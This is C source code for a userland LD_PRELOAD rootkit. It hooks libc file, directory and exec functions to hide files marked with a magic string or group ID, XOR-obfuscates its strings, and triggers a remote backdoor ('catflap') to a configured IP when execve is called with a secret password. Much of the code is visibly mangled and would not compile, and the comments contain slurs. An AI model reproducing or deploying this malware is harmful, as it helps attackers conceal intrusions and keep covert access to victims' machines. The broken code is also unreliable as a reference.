#
define _GNU_SOURCE# include < stdio.h > #include < unistd.h > #include < strings.h > #include < string.h > #include < dlfcn.h > #include < fcntl.h > #include < errno.h > #include < utmp.h > #include < utmpx.h > #include < sys / stat.h > #include < sys / ioctl.h > #include < sys / types.h > #include < errno.h > #include < termios.h > #include < netinet / in .h > #include < dirent.h > #include < limits.h > #include "utils/clean.h"
#include "utils/catflap.h"
#include "rkconst.h"

/*
	NOT AUTISTIC VERSION ORGINAL BY LMAOCOW "LOLCOW"
  ==========HOOKS============
 * execve 
 * chmod 
 * ptrace (wait no lol)
 * fgets
 * directory functions 
 |-> readdir 
 |-> chdir 
 |-> mkdir 
 |-> mkdirat 
 |-> rmdir 
 |-> opendir
 |-> fdopendir
 * file linking functions
 |-> link 
 |-> linkat
 |-> unlink 
 |-> unlinkat 
 |-> symlink 
 |-> symlinkat 
 * file open functions 
 |-> access 
 |-> fopen 
 * file status functions 
 |-> stat 
 |-> fstat 
 |-> fstatat 
 |-> lstat
 ============================
*/
//function pointers to hooked functions
int( * old_execve)(const char * path, char *
  const argv[], char *
    const envp[]);
int( * old_chmod)(const char * pathname, mode_t mode);
char * ( * old_fgets)(char * s, int size, FILE * stream);

//directory functions
struct dirent * ( * old_readdir)(DIR * dirp);
int( * old_chdir)(const char * path);
int( * old_mkdir)(const char * pathname, mode_t mode);
int( * old_mkdirat)(int dirfd,
  const char * pathname, mode_t mode);
int( * old_rmdir)(const char * pathname);
DIR * ( * old_opendir)(const char * name);
DIR * ( * old_fdopendir)(int fd);

//file linking functions 
int( * old_link)(const char * oldpath,
  const char * newpath);
int( * old_unlink)(const char * path);
int( * old_symlink)(const char * path1,
  const char * path2);

//file opening functions 
int( * old_access)(const char * path, int amode);
int( * old_faccessat)(int fd,
  const char * path, int amode, int flag);
FILE * ( * old_fopen)(const char * pathname,
  const char * mode);

//stat functions
int( * old_stat)(const char * path, struct stat * buf);
int( * old_stat64)(const char * path, struct stat64 * buf);
int( * old___xstat)(int ver,
  const char * path, struct stat * buf);
int( * old_fstat)(int fildes, struct stat * buf);
int( * old_fstatat)(int fd,
  const char * restrict path, struct stat * restrict buf, int flag);
int( * old_lstat)(const char * restrict path, struct stat * restrict buf);

void xor(char * s) {
  int i, key = 0x2A;
  for (i = 0; i < strlen(s); i++) s[i] ^= key;
}

int owned(void) {
  int x;
  if ((getuid() == 0) || getgid() == MAGICGID) {
    setuid(0);
    x = 1;
  } else
    x = 0;
  return x;
}

int execve(const char * path, char *
  const argv[], char *
    const envp[]) {
  HOOK(execve);#
  ifdef DEBUG
  printf("[!] execve hooked");#
  endif

  if (owned()) {
    if (argv[1] != NULL) {
      char * execpw = strdup(EXECPW);
      xor(execpw);
      if (!strcmp(argv[1], execpw)) {
        if (!strcmp(argv[2], "catflap")) {
          printf("opening catflap\n");
          catflap(IP, DEFAULT_PORT);
        }
      }
      CLEAN(execpw);
      return old_execve(path, argv, envp);
    }
    return old_execve(path, argv, envp);
  }
  return old_execve(path, argv, envp);
}

int chmod(const char * path, mode_t mode) {
  HOOK(chmod);#
  ifdef DEBUG
  printf("[!] chmod hooked");#
  endif

  char * magic = strdup(MAGIC);
  xor(magic);
  struct stat filestat;
  HOOK(stat);
  old_stat(path, & filestat);
  if (owned()) {
    if (strstr(path, MAGIC) || (!strcmp(filestat.st_gid, MAGICGID))) {
      errno = ENOENT;
      return -1;
    }
    CLEAN(magic);
    return old_chmod(path, mode);
  }
  CLEAN(magic);
  return old_chmod(path, mode);
}

int stat(const char * path, struct stat * buf) {
  HOOK(stat);#
  ifdef DEBUG
  printf("[!] stat hooked");#
  endif

  char * magic = strdup(MAGIC);
  xor(magic);
  if (owned()) {
    if (strstr(path, magic)) {
      errno = ENOENT;
      return -1;
    }
    CLEAN(magic);
    return old_stat(path, buf);
  }
  CLEAN(magic);
  return old_stat(path, buf);
}

int stat64(const char * path, struct stat64 * buf) {
  HOOK(stat64);#
  ifdef DEBUG
  printf("[!] stat64 hooked");#
  endif

  char * magic = strdup(MAGIC);
  xor(magic);
  if (owned()) {
    if (strstr(path, magic)) {
      errno = ENOENT;
      return -1;
    }
    CLEAN(magic);
    return old_stat64(path, buf);
  }
  CLEAN(magic);
  return old_stat64(path, buf);
}

int __xstat(int ver,
  const char * path, struct stat * buf) {
  /* this implementation of __xstat was ripped from azazel because im gay and am going to implement POSIX-compliant function hooks by June 2018*/

  HOOK(__xstat);
  struct stat s_fstat;#
  ifdef DEBUG
  printf("[!] __xstat hooked");#
  endif
  char * magic = strdup(MAGIC);
  xor(magic);
  memset( & s_fstat, 0, sizeof(stat));
  old___xstat(ver, path, & s_fstat);

  #
  ifdef DEBUG
  printf("PATH: %s\n", path);
  printf("GID: %s\n", s_fstat.st_gid);#
  endif

  memset( & s_fstat, 0, sizeof(stat));

  if (strstr(path, magic) || !strcmp(s_fstat_st.gid, MAGICGID)) {
    errno = ENOENT;
    return -1;
  }
  return old___xstat(ver, path, buf);
}

int lstat(const char * pathname, struct stat * buf) {
  HOOK(lstat);#
  ifdef DEBUG
  printf("[!] lstat hooked");#
  ifdef DEBUG
  struct stat filestat;
  CLEAN(filestat);

  if (owned()) {
    old_lstat(pathname, & filestat);
    char * magic = strdup(MAGIC);
    xor(magic);
    if (strstr(pathname, magic) || !(strcmp(filestat.st_gid, MAGICGID))) {
      errno = ENOENT;
      return -1;
    }
    CLEAN(magic);
    CLEAN(filestat);
    return old_lstat(pathname, buf);
  }
  CLEAN(magic);
  CLEAN(filestat);
  return old_lstat(pathname, buf);
}

int link(const char * oldpath,
  const char * newpath) {
  HOOK(link);#
  ifdef DEBUG
  printf("[!] link hooked");#
  endif

  char * magic = strdup(MAGIC);
  xor(magic);
  struct stat filestat;
  HOOK(stat);
  old_stat(oldpath, & filestat);
  if (owned()) {
    if (strstr(oldpath, MAGIC) || (!strcmp(filestat.st_gid, MAGICGID))) {
      errno = ENOENT;
      return -1;
    }
    CLEAN(magic);
    CLEAN(filestat);
    return old_link(oldpath, newpath);
  }
  CLEAN(magic);
  CLEAN(filestat);
  return old_link(oldpath, newpath);
}

int unlink(const char * path) {
  HOOK(unlink);#
  ifdef DEBUG
  printf("[!] unlink hooked");#
  endif

  char * magic = strdup(MAGIC);
  xor(magic);
  struct stat filestat;
  HOOK(stat);
  old_stat(path, & filestat);
  if (owned()) {
    if (strstr(path, MAGIC) || (!strcmp(filestat.st_gid, MAGICGID))) {
      errno = ENOENT;
      return -1;
    }
    CLEAN(magic);
    CLEAN(filestat);
    return old_unlink(path);
  }
  CLEAN(magic);
  CLEAN(filestat);
  return old_unlink(path);
}

int symlink(const char * path1,
    const char * path2) {
    HOOK(symlink);#
    ifdef DEBUG
    printf("[!] symlink hooked");#
    endif

    char * magic = strdup(MAGIC);
    xor(magic);
    struct stat filestat1, filestat2;
    HOOK(stat);
    old_stat(path1, & filestat1);
    old_stat(path2, & filestat2);
    if (owned()) {
      if (strstr(path1, MAGIC) || strstr(path2, MAGIC) || (!strcmp(filestat1.st_gid, MAGICGID)) || (!strcmp(filestat2.st_gid, MAGICGID))) {
        errno = ENOENT;
        return -1;
      }
      CLEAN(magic);
      CLEAN(filestat1);
      CLEAN(filestat2);
      return old_symlink(path1, path2);
    }
    CLEAN(magic);
    CLEAN(filestat1);
    CLEAN(filestat2);
    return old_symlink(path1, path2);
  }
  /*
     _                       
    (_)_ _    ___ ____ ___ __
   / /  ' \  / _ `/ _ `/ // /
  /_/_/_/_/  \_, /\_,_/\_, /  -- Yes you are
            /___/     /___/
  */

struct dirent * readdir(DIR * dirp) {
  HOOK(readdir);#
  ifdef DEBUG
  printf("[!] readdir hooked");#
  endif
  // this hook made me suicidal 
  char * magic = strdup(MAGIC);
  xor(magic);
  struct dirent * dir;
  struct stat filestat;
  HOOK(__xstat);
  if (owned()) return old_readdir(dirp);
  do {
    dir = old_readdir(dirp);
    if (dir != NULL && (!strcmp(dir - > d_name, ".\0") == 0) || strcmp(dir - > d_name, "/\0"))
      continue;
    if (dir != NULL) {
      char path[PATH_MAX + 1];
      proc = strdup(PROC);
      xor(PROC);
      snprintf(path, PATH_MAX, proc, dir - > d_name);
      old___xstat(_STAT_VER, path, & filestat);
      if (strstr(path, MAGIC) || filestat.st_gid == MAGICGID)
        continue;
      CLEAN(filestat);
    }
  } while (dir && (s_fstat.st_gid == magic));

  return dir;
}

int chdir(const char * path) {
  HOOK(chdir);#
  ifdef DEBUG
  printf("[!] chdir hooked");#
  endif

  char * magic = strdup(MAGIC);
  xor(magic);
  if (strstr(path, magic)) {
    errno = ENOENT;
    return -1;
  }
  CLEAN(magic);
  return old_chdir(path);
}

int mkdir(const char * pathname, mode_t mode) {
  HOOK(mkdir);#
  ifdef DEBUG
  printf("[!] mkdir hooked");#
  endif

  char * magic = strdup(MAGIC);
  xor(magic);
  if (owned()) {
    if (strstr(pathname, magic)) {
      errno = ENOENT;
      return -1;
    }
    CLEAN(magic);
    return old_mkdir(pathname, mode);
  }
  CLEAN(magic);
  return old_mkdir(pathname, mode);
}

int mkdirat(int dirfd,
  const char * pathname, mode_t mode) {
  HOOK(mkdirat);#
  ifdef DEBUG
  printf("[!] mkdirat hooked");#
  endif

  char * magic = strdup(MAGIC);
  xor(magic);
  if (owned()) {
    if (strstr(pathname, magic)) {
      errno = ENOENT;
      return -1;
    }
    CLEAN(magic);
    return old_mkdirat(dirfd, pathname, mode);
  }
  CLEAN(magic);
  return old_mkdirat(dirfd, pathname, mode);
}

int rmdir(const char * pathname) {
  HOOK(rmdir);#
  ifdef DEBUG
  printf("[!] rmdir hooked");#
  endif

  char * magic = strdup(MAGIC);
  xor(magic);
  struct stat filestat;
  HOOK(stat);
  old_stat(pathname, & filestat);
  if (owned()) {
    if (strstr(pathname, magic) || !strcmp(filestat.st_gid, MAGICGID)) {
      errno = ENOENT;
      return -1;
    }
    CLEAN(magic);
    CLEAN(filestat);
    return old_rmdir(pathname);
  }
  CLEAN(magic);
  CLEAN(filestat);
  return old_rmdir(pathname);
}

DIR * opendir(const char * name) {
  HOOK(opendir);#
  ifdef DEBUG
  printf("[!] opendir hooked");#
  endif

  char * magic = strdup(MAGIC);
  xor(magic);
  if (owned()) {
    if (strstr(name, magic)) {
      errno = ENOENT;
      return -1;
    }
    CLEAN(magic);
    return old_opendir(name);
  }
  CLEAN(magic);
  return old_opendir(name);
}

int access(const char * pathname, int mode) {
  HOOK(access);#
  ifdef DEBUG
  printf("[!] access hooked");#
  endif

  char * magic = strdup(MAGIC);
  xor(magic);
  if (owned()) {
    if (strstr(pathname, magic)) {
      errno = ENOENT;
      return -1;
    }
    CLEAN(magic);
    return old_access(pathname, mode);
  }
  CLEAN(magic);
  return old_access(pathname, mode);
}

FILE * fopen(const char * pathname,
  const char * mode) {
  HOOK(fopen);#
  ifdef DEBUG
  printf("[!] fopen hooked");#
  endif

  char * magic = strdup(MAGIC);
  xor(magic);
  struct stat filestat;
  HOOK(stat);
  old_stat(pathname, & filestat);
  if (owned()) {
    if (strstr(pathname, MAGIC) || !strcmp(filestat.st_gid, MAGICGID)) {
      errno = ENOENT;
      return -1;
    }
    CLEAN(magic);
    CLEAN(filestat);
    return old_fopen(pathname, mode);
  }
  CLEAN(magic);
  CLEAN(filestat);
  return old_fopen(pathname, mode);
}

char * fgets(char * s, int size, FILE * stream) {

  char * p;
  struct stat filestat;
  HOOK(fgets);
  p = old_fgets(s, size, stream);
  if (p == NULL)
    return (p);
  if (owned())
    return old_fgets(s, size, stream);
  HOOK(access);
  HOOK(stat);
  if (old_access(s, F_OK) != -1) // is s a file or directory? 
  {
    old_stat(s, & filestat);
    char * magic = strdup(MAGIC);
    xor(magic);
    if (!strcmp(filestat.st_gid, MAGICGID)) {
      return NULL; // s is owned by magic; return null
      CLEAN(magic);
      CLEAN(p);
    } else {
      return p; // continue
      CLEAN(magic);
      CLEAN(p);
    }
  }
  return p;
}

void init(void) {#
  ifdef DEBUG
  printf("RKOROVA LOADED");#
  endif
}
